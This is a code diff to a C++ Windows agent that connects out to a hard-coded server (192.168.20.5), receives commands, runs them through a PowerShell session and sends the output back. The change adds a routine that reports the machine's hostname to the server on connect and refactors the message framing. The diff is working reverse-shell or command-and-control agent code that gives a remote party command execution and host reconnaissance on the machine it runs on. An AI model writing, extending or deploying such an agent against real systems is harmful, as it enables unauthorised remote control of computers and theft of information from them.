@@ -6,13 +6,39 @@
 #include "PowerShellSession.hpp"
 
 #pragma comment(lib, "ws2_32.lib")
+VOID PrependStringSize(std::string szData, std::string& szOutput) {
+    uint32_t uiNetMessageLen;
+
+    uiNetMessageLen = htonl(szData.size());
+    szOutput = std::string(reinterpret_cast<char*>(&uiNetMessageLen), 4);
+    szOutput += szData;
+}
+
+
+VOID SendComputerName(SOCKET sock) {
+    CHAR carrComputerName[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD dwComputerNameLength;
+    std::string szComputerName;
+    std::string szFinalComputerName;
+
+    dwComputerNameLength = sizeof(carrComputerName);
+
+    if (!GetComputerNameA(carrComputerName, &dwComputerNameLength)) {
+        std::cerr << "GetComputerNameA failed! Error: " << GetLastError() << std::endl;
+        return;
+
+    }
+
+    std::cout << "Hostname: " << carrComputerName << std::endl;
+    szComputerName.append(carrComputerName, dwComputerNameLength);
+    PrependStringSize(szComputerName, szFinalComputerName);
+    send(sock, szFinalComputerName.data(), szFinalComputerName.length(), 0);
+}
 
 VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
     INT iBytesReceived;
     CHAR carrRecvbuf[MAX_BUFFER_SIZE];
-    uint32_t uiNetMessageLen;
     std::string szCwd;
-    std::string szFinalCwd;
     std::string szFinalData;
     std::string szCommandOutput;
 
@@ -23,17 +49,14 @@ VOID CommandListenerLoop(SOCKET socket, PowerShellSession& psSession) {
         std::cout << "[+] Received command: " << command << "\n";
         szCommandOutput = psSession.RunCommand(command);
 
-        uiNetMessageLen = htonl(szCommandOutput.size());
-        szFinalData = std::string(reinterpret_cast<char*>(&uiNetMessageLen), 4);
-        szFinalData += szCommandOutput;
-
+        PrependStringSize(szCommandOutput, szFinalData);
         send(socket, szFinalData.data(), szFinalData.length(), 0);
     }
 }
 
 
 INT main() {
-    const INT iServerPort = 3001;
+    const INT iServerPort = AGENT_PORT;
     const CHAR* szServerIp = "192.168.20.5";
     WSADATA wsaData;
     SOCKET sock = INVALID_SOCKET;
@@ -70,6 +93,8 @@ INT main() {
     }
 
     std::cout << "[+] Connected to server " << szServerIp << ":" << iServerPort << "\n";
+
+    SendComputerName(sock);
     CommandListenerLoop(sock, psSession);
     closesocket(sock);
     WSACleanup();
